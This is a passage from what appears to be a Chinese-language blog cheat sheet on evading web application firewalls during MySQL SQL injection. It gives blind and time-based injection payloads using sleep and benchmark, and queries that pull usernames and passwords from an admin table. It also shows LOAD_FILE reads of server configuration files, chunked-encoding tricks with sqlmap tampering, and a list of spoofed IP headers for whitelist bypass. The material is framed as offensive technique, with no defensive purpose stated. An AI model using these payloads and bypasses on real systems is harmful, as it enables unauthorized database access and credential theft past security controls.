- 垃圾数据需**超过 WAF 默认检测长度**  
（通常 4KB 以上）  
- MySQL 中优先使用 /*!50001xxx*/（版本号限定注释），提高绕过成功率  
# 等价函数绕过  
- hex()、unhex()、bin() 、char()、ascii()、ord()、conv()  
- hex()：SELECT * from admin where hex(substr(username,1,1))=61  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjIIV9CUcR60Kk5toJ4FhS7xH5MVUKUupIJKgY5ZkIC5EURCHPaErnAQ/640?wx_fmt=png&from=appmsg "")  
- unhex()：SELECT * from admin where substr(username,1,1) = unhex('61')  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjr05YbMO4FfUV6fzPUhSrxG2J5td2jcH4yQKcK0BsdmX2ejfWicrweMg/640?wx_fmt=png&from=appmsg "")  
- bin()：  
- select bin(ascii(substring(database(),1,1)))  
- 之后通过二进制还原为字符串  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjVeqYXd6yr5zH7cE8ctDUMicreWEGO0GliaHd8zmhr5WVN9zRgyo3llGw/640?wx_fmt=png&from=appmsg "")  
-  char()：SELECT * from admin where substr(username,1,1) = char(b'01100001')  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjxgdSLPO5icAmXB1Sgdr9GymgS30L8icicYSicft0xwlvKF8Zqaaiaibhsujg/640?wx_fmt=png&from=appmsg "")  
- ascii()：SELECT * from admin where ascii(substr(username,1,1)) = 97  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjgeMrsehcSuAEX0iaBia4yphiblzEn3UlyhOYptg8AonqbTX7LYpqqUlicw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjsedmtcTWib1A1nzRl306ymrcaicfYS88QyygqhOG67mWaNuxQvfibWVng/640?wx_fmt=png&from=appmsg "")  
- ord  
()：  
SELECT * from admin where ord(substr(username,1,1)) = 97  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjYibV2PiaoDwicKibJ1Mc4DtPNLvVUU7XDUJoo5RoAKmubmO8yD6rHiaibsUA/640?wx_fmt=png&from=appmsg "")  
- conv()：  
- 将十进制数字 N 转换为二进制字符串：  
select conv(ascii(substring(database(),1,1)),10,2)  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjBX4qHibiaoZq9mHFlSYPBzAcLNpJaDeIB8q9DsQ3jiap0Pib1lLZQ0xMAw/640?wx_fmt=png&from=appmsg "")  
- 将十进制数字 N 转换为十六进制：  
select conv(ascii(substring(database(),1,1)),10,16)  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjQNlQGdTicCicToNBw1gdkIkXEnc77jLZlzvbql8ugdfiaKjAiaicqHh3onQ/640?wx_fmt=png&from=appmsg "")  
- sleep() ==>benchmark()  
- sleep()：select IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0)  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGj4BU20YRFQf6IFOygyRUf5cIe08Ep1c7PeibS88dico5ibWsrZsQCXrfWg/640?wx_fmt=png&from=appmsg "")  
- benchmark()：select IF(ASCII(SUBSTR(database(),1,1))=116, BENCHMARK(10000000,MD5('a')), 0)  
- 若条件成立（首字符 ASCII 为 116，即 't'），执行 1000 万次 MD5('a') 产生延迟  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjwkibIg6Xw07NEVs6p5E4YrfiaibNhkx4akZ5t162vEjBx6b2icLxe14VMA/640?wx_fmt=png&from=appmsg "")  
- concat_ws()、group_concat()、CONCAT()  
- concat_ws()：select CONCAT_WS('-', username, password) FROM admin  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjCNsMYKju0Tsaia34jicBNM9VhTiaQQPZ7fiaRWPrSRUPcwE8GTAxIU10qQ/640?wx_fmt=png&from=appmsg "")  
- group_concat()：select group_concat(username, 0x7e, password, 0x7e)  FROM admin  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjh75Z7ZqMnv7YuN2qcJKkhUjPSRsQYeP6fP5icMVfKt3S4OcIyG43P7Q/640?wx_fmt=png&from=appmsg "")  
- CONCAT()：select CONCAT(username, '-', password)  FROM admin  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjK1MicMUHqDbGhsEJuLqDd8mzibviaJbibEGicibLXiaph7K3FrmLlVmH0GXeg/640?wx_fmt=png&from=appmsg "")  
- mid()、substr()、 substring()、LEFT() + RIGHT()、REVERSE()  
- mid()：SELECT MID(database(), 1, 3)		#从第1字符开始取3字符  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjNt5sMSvHU6f4Prdicsf3W1ficeVQ1utAcGtic4tqDDfFCX3quC7HCweTw/640?wx_fmt=png&from=appmsg "")  
- substr()：SELECT substr(database(), 1, 3)		#从第1字符开始取3字符  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjJRRo3DJPqNd2Yf8ibLrkH9l73zItTDaIvicNt6IlpwdvBYTIscouxlLA/640?wx_fmt=png&from=appmsg "")  
-  substring()：SELECT substring(database(), 1, 3)		#从第1字符开始取3字符  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjIkbVpX6tELTk0pnBZ4Vag1VmPTTSXlJyibuiaOfsadsjUiaYZ9L3dzfHg/640?wx_fmt=png&from=appmsg "")  
- LEFT() + RIGHT() 组合：SELECT LEFT(RIGHT(database(), 4), 2)  
- 数据库：test，RIGHT取后四位test，LEFT取前两位te，最终结果为te  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjk4Y1yEDybNEIzbKzsGAIxfYVggrsydEySMt8n6863ha8VZ6fvqMNlQ/640?wx_fmt=png&from=appmsg "")  
- REVERSE()反转截取：  
  
- 截取倒数第3字符：SELECT REVERSE(SUBSTRING(REVERSE(database()) FROM 3 FOR 1));  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjlbQWuyPpGJT1LpLviatO30uAZvxqV7SuJqrw6ONp80JbvXp6xMQia8jw/640?wx_fmt=png&from=appmsg "")  
- @@user、 user()、current_user()  
- @@user：select @@user  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjwybT1WBrT0quTriadoiaicaqEbDEUFZ2oAAj3UBDp6Kl2NVvy78DRb4ZQ/640?wx_fmt=png&from=appmsg "")  
- user()：select user()  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjh2ZPCjicuszvjmoiaY81huWEIibLuH4mDPgTTQ3cVwpSPLNvIGXJMicTiaQ/640?wx_fmt=png&from=appmsg "")  
- SELECT current_user()  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjSbvibusu6YaCvUoRf1IPCQV7Z6KKDkdoRfH7aDS8Hsia1b7icwYXwDYEA/640?wx_fmt=png&from=appmsg "")  
- @@datadir、datadir()、系统变量查询、读取配置文件、@@basedir  
- @@datadir：select @@datadir  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjhQFuatcXYLhokPRYNYp5kBnVtl5K1Yzf7UhowCK1g9xCT75bCYaucQ/640?wx_fmt=png&from=appmsg "")  
- datadir()：select datadir()  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjrk0PXSgkTZqmrCaopETrs0PCib9UHdec0bK6VibckgR6kW5fH3LMg44w/640?wx_fmt=png&from=appmsg "")  
- 系统变量查询：SHOW VARIABLES LIKE 'datadir'  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjjf1VeXBtI3KmGiarAw0YEuTtCV63xuWMfnT9NI1lcrbnhxWkdpmQicdA/640?wx_fmt=png&from=appmsg "")  
- 读取配置文件：SELECT LOAD_FILE('C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\my.ini')  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjEgaaANv6Y4mN7G7MINJYxZyndIKxL1cv5PkfUNSxXIgbO0rWgL7mSw/640?wx_fmt=png&from=appmsg "")  
- @@basedir：SELECT @@basedir  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjOodvg4932UdicbticyoQuuuyB1ibLPicmFRWQOQQic9ial4Hibia6CLIh49TOg/640?wx_fmt=png&from=appmsg "")  
- if、IFNULL、case when then、逻辑运算符组合、SIGN()+ 数学运算、字符串匹配函数  
- if函数的判断语句：select if(substr(database(),1,1)='t',sleep(10),0);  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjUOQFVA3FToILyM2biaRv4IMnpHvBIYqbhUcUL4C9DwIVneiahMdt4A7w/640?wx_fmt=png&from=appmsg "")  
- IFNULL函数：SELECT IFNULL(NULLIF(ASCII(SUBSTRING(DATABASE(),1,1)),116), SLEEP(5))  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGj4dS4CdmxYYibYc44B0A0BmXyD8vPsQcuZyVuEm5JSW51XiaOViajQzibLg/640?wx_fmt=png&from=appmsg "")  
- case when then函数：SELECT CASE WHEN (ASCII(SUBSTRING(DATABASE(),1,1))=116) THEN SLEEP(5) ELSE 0 END  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjUIhxswPm90p0ibnGChoTIpMMiaVuu9Z87dGVprqa4r0O28Oo6Buwa7Ow/640?wx_fmt=png&from=appmsg "")  
- 逻辑运算符组合：  
- SELECT (ASCII(SUBSTRING(DATABASE(),1,1))=116) AND SLEEP(5)  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjzKBXHkSM2DgZb8OX7HLPZPUaLDYOGJMZw7q0ic17MrgyhOVT4uDCu5g/640?wx_fmt=png&from=appmsg "")  
- SELECT (SELECT BENCHMARK(10000000,MD5('t')) WHERE ASCII(SUBSTRING(DATABASE(),1,1))=116)  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjgMLSR7uxIST0qjLrSlYTzL7tInjnSsIkZdkhykWqgxC8OqKDPwQ9rQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjRO7t5YSjicjRnj0gWt5RTBoZUYkL08Dibgq9iceibn8miayBL0IHyPjiaGFg/640?wx_fmt=png&from=appmsg "")  
- SIGN()+ 数学运算：SELECT SIGN(ASCII(SUBSTRING(DATABASE(),sleep(5),1))-116)=0  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjRkBTxeHqCbt8fpsDxiccp4p729Z4E7SXuDlQm7nTOs2m1NLZT5cEWibQ/640?wx_fmt=png&from=appmsg "")  
- 字符串匹配函数：（仅适合布尔盲注，根据页面状态去判断）  
  
- like：SELECT  (SELECT DATABASE()) LIKE 't%'  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjAsduoGZGgJrGIiamYZyfSFLqQ93zA9uTCqrtKVMW49Afa7r11oicOWgw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjXph9rO4uyuDibgoQhBerfoffgpcVJVYjIibQNsGPwSs3ayX9qXQzAVkg/640?wx_fmt=png&from=appmsg "")  
- regexp：SELECT  (SELECT DATABASE()) REGEXP '^t'  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjXkv9iaiaO8sGpWcibHMiaxNo4Hib4XOtqYFB74AN5EIHQWPiaozseibDZFvAw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjuJQxicr4nLfMmBseQicr9A6RAjNtsNXlpIbnzS7wY8U6kcRXK61ic8iceg/640?wx_fmt=png&from=appmsg "")  
# 分块传输  
- Burp插件：chunked-coding-converter  
- **sqlmap Tamper脚本**  
：  
结合--tamper=chunked参数，动态生成分块Payload  
- SQL注入分块传输是一种利用HTTP协议的分块编码（Chunked Transfer Encoding）绕过Web应用防火墙（WAF）的注入技术。其核心原理是通过将恶意SQL语句分散到多个数据块中，破坏WAF对请求体的完整性检测，从而绕过规则过滤  
- **分块传输编码机制：**  
- HTTP/1.1协议允许将响应体拆分为多个小块传输，每个块以十六进制长度开头，后跟数据块和结束符\r\n，最后以0\r\n\r\n终止传输  
- **攻击利用**  
：WAF通常基于完整请求体进行规则匹配，分块传输会使其无法正确解析恶意负载，导致注入语句被忽略  
- **绕过WAF的关键技巧：**  
- **注释干扰**  
：在块长度声明后添加随机注释（如2;xyz\r\nid\r\n），干扰WAF的语法解析  
- **空白符混淆**  
：使用%09（Tab）、%0A（换行）等空白符分割敏感关键词（如se%0Alect）  
- **大小写混合与拼接**  
：例如CONCAT('sel','ect')或SeLeCt，规避关键字黑名单  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGj9D7hPNwsj8AxXFeNSmJaO6AenibrgwkxJnguSibRJV45cpvHTMh1gthQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjpBMsS3txI1Cw1nacJmlSBxMicayZCHjGKK3ydD18jWSv92LTRm63j5w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGj4h3XnYzo6wplUPQuic1jVMnw5AfILYf59orSKX4xItvu8oqonzBVyibg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjCa728bWEJrSotHZNDkuS07pVBh9ZRGXjBlnAgZpvuOWjHloOPUH0BA/640?wx_fmt=png&from=appmsg "")  
# 更改请求  
- 尝试更改Get请求为Post请求  
  
# 白名单绕过  
- IP白名单  
  
- 可使用Burp插件burpFakeIP  
  

```
X-Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
Forwarded: 127.0.0.1
X-Requested-With: 127.0.0.1
X-Forwarded-Proto: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-remote-IP: 127.0.0.1
X-remote-addr: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
Ali-CDN-Real-IP: 127.0.0.1
Cdn-Src-Ip: 127.0.0.1
Cdn-Real-Ip: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-Cluster-Client-IP: 127.0.0.1
WL-Proxy-Client-IP: 127.0.0.1
Proxy-Client-IP: 127.0.0.1
Fastly-Client-Ip: 127.0.0.1
True-Client-Ip: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjFpwOvzicD7ePWY6XTjnu1pHdQsv9aVY9uvDLkrvaVeHnfB2lENZ8PlA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGj66ykoZfsSicmicSPGVaPhniaztBD4ZSoqGHTkd6Jia8pr0qIAg9jT3WzhA/640?wx_fmt=png&from=appmsg "")  
- 特定静态资源，如.js、.jpg、.swf、.css等  
  
- URL白名单，如管理员后台地址  
  
最后，因本人才疏学浅，总结出来的可能只是冰山一角(遗漏或出错)，愿各位师傅能总结出新型的绕过方式以及技巧！！！  
  
  
  
